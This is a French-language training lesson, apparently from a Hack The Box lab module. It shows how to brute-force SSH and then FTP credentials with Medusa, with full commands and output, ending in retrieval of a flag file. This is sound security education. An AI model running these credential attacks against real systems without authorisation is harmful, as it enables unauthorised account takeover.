---
tags:
  - brute-force
ordre: 10
---

# Services Web

---

Dans le paysage dynamique de la cybersécurité, le maintien de mécanismes d'authentification robustes est primordial. Bien que des technologies comme Secure Shell (`SSH`) et File Transfer Protocol (`FTP`) facilitent l'accès à distance sécurisé et la gestion de fichiers, elles reposent souvent sur des combinaisons traditionnelles de nom d'utilisateur et de mot de passe, présentant des vulnérabilités potentielles exploitables par des attaques par force brute (brute-force attacks). Dans ce module, nous nous pencherons sur l'application pratique de `Medusa`, un puissant outil de forçage brut, pour compromettre systématiquement les services SSH et FTP, illustrant ainsi les vecteurs d'attaque potentiels et soulignant l'importance de pratiques d'authentification renforcées.

`SSH` est un protocole réseau cryptographique qui fournit un canal sécurisé pour la connexion à distance, l'exécution de commandes et les transferts de fichiers sur un réseau non sécurisé. Sa force réside dans son chiffrement, qui le rend nettement plus sûr que des protocoles non chiffrés comme `Telnet`. Cependant, des mots de passe faibles ou faciles à deviner peuvent saper la sécurité de SSH, l'exposant à des attaques par force brute.

`FTP` est un protocole réseau standard pour le transfert de fichiers entre un client et un serveur sur un réseau informatique. Il est également largement utilisé pour téléverser et télécharger des fichiers depuis des sites web. Cependant, le FTP standard transmet les données, y compris les identifiants de connexion, en clair, ce qui le rend vulnérable à l'interception et au forçage brut.

## Lancement

**Pour suivre, démarrez le système cible via la section des questions en bas de la page.**

Nous commençons notre exploration en ciblant un serveur SSH fonctionnant sur un système distant. En supposant une connaissance préalable du nom d'utilisateur `sshuser`, nous pouvons utiliser Medusa pour essayer systématiquement différentes combinaisons de mots de passe jusqu'à ce que l'authentification réussisse.

La commande suivante sert de point de départ :

```bash
Hiterof13@htb[/htb]$ medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
```

Détaillons chaque composant :

- `-h <IP>` : Spécifie l'adresse IP du système cible.
- `-n <PORT>` : Définit le port sur lequel le service SSH est à l'écoute (généralement le port 22).
- `-u sshuser` : Définit le nom d'utilisateur pour l'attaque par force brute.
- `-P 2023-200_most_used_passwords.txt` : Indique à Medusa une liste de mots (wordlist) contenant les 200 mots de passe les plus couramment utilisés en 2023. L'efficacité d'une attaque par force brute est souvent liée à la qualité et à la pertinence de la liste de mots utilisée.
- `-M ssh` : Sélectionne le module SSH dans Medusa, adaptant l'attaque spécifiquement pour l'authentification SSH.
- `-t 3` : Détermine le nombre de tentatives de connexion parallèles à exécuter simultanément. Augmenter ce nombre peut accélérer l'attaque mais peut aussi augmenter la probabilité de détection ou de déclenchement de mesures de sécurité sur le système cible.

```bash
Hiterof13@htb[/htb]$ medusa -h IP -n PORT -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3  Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net> ... ACCOUNT FOUND: [ssh] Host: IP User: sshuser Password: 1q2w3e4r5t [SUCCESS]
```

Lors de l'exécution, Medusa affichera sa progression au fur et à mesure qu'il parcourt les combinaisons de mots de passe. La sortie indiquera une connexion réussie, révélant le mot de passe correct.

## Obtenir l'accès

Avec le mot de passe en main, établissez une connexion SSH en utilisant la commande suivante et entrez le mot de passe trouvé lorsque vous y êtes invité :

```bash
Hiterof13@htb[/htb]$ ssh sshuser@<IP> -p PORT
```

Cette commande lancera une session SSH interactive, vous donnant accès à la ligne de commande du système distant.

### Élargir la surface d'attaque

Une fois à l'intérieur du système, l'étape suivante consiste à identifier d'autres surfaces d'attaque potentielles. En utilisant `netstat` (dans la session SSH) pour lister les ports ouverts et les services à l'écoute, vous découvrez un service fonctionnant sur le port 21.

```bash
Hiterof13@htb[/htb]$ netstat -tulpn
| grep LISTEN  tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      - tcp6       0      0 :::22                   :::*                    LISTEN      - tcp6       0      0 :::21                   :::*                    LISTEN      -
```

Une reconnaissance plus approfondie avec `nmap` (dans la session SSH) confirme cette découverte comme étant un serveur ftp.

```bash
Hiterof13@htb[/htb]$ nmap localhost
Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-05 13:19 UTC
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000078s latency). Other addresses for localhost (not scanned): ::1
Not shown: 998 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds
```

### Cibler le serveur FTP

Après avoir identifié le serveur FTP, vous pouvez procéder au forçage brut de son mécanisme d'authentification.

Si nous explorons le répertoire `/home` sur le système cible, nous voyons un dossier `ftpuser`, ce qui implique la probabilité que le nom d'utilisateur du serveur FTP soit `ftpuser`. Sur cette base, nous pouvons modifier notre commande Medusa en conséquence :

```bash
Hiterof13@htb[/htb]$ medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5  Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>  GENERAL: Parallel Hosts: 1 Parallel Logins: 5 GENERAL: Total Hosts: 1 GENERAL: Total Users: 1 GENERAL: Total Passwords: 197 ... ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: ... Password: ... [SUCCESS] ... GENERAL: Medusa has finished.
```

Les principales différences ici sont :

- `-h 127.0.0.1` : Cible le système local, car le serveur FTP s'exécute localement. L'utilisation de l'adresse IP indique explicitement à medusa d'utiliser IPv4.
- `-u ftpuser` : Spécifie le nom d'utilisateur `ftpuser`.
- `-M ftp` : Sélectionne le module FTP dans Medusa.
- `-t 5` : Augmente le nombre de tentatives de connexion parallèles à 5.

### Récupérer le flag

Après avoir réussi à cracker le mot de passe FTP, établissez une connexion FTP. Dans la session FTP, utilisez la commande `get` pour télécharger le fichier `flag.txt`, qui peut contenir des informations sensibles. :

```bash
Hiterof13@htb[/htb]$ ftp ftp://ftpuser:<FTPUSER_PASSWORD>@localhost  Trying [::1]:21 ... Connected to localhost. 220 (vsFTPd 3.0.5) 331 Please specify the password. 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. 200 Switching to Binary mode.

ftp> ls 229 Entering Extended Passive Mode (|||25926|) 150 Here comes the directory listing. -rw-------    1 1001     1001           35 Sep 05 13:17 flag.txt 226 Directory send OK.

ftp> get flag.txt local: flag.txt remote: flag.txt 229 Entering Extended Passive Mode (|||37251|) 150 Opening BINARY mode data connection for flag.txt (35 bytes). 100% |***************************************************************************|    35      776.81 KiB/s    00:00 ETA 226 Transfer complete. 35 bytes received in 00:00 (131.45 KiB/s)

ftp> exit 221 Goodbye.
```

Lisez ensuite le fichier pour obtenir le flag :

```bash
Hiterof13@htb[/htb]$ cat flag.txt HTB{...}
```

La facilité avec laquelle de telles attaques peuvent être exécutées souligne l'importance d'utiliser des mots de passe forts et uniques.
---

← [[09 - Medusa]] | [[00 - Sommaire Login Brute Forcing|Sommaire]] | [[11 - Listes de mots personnalisées]] →
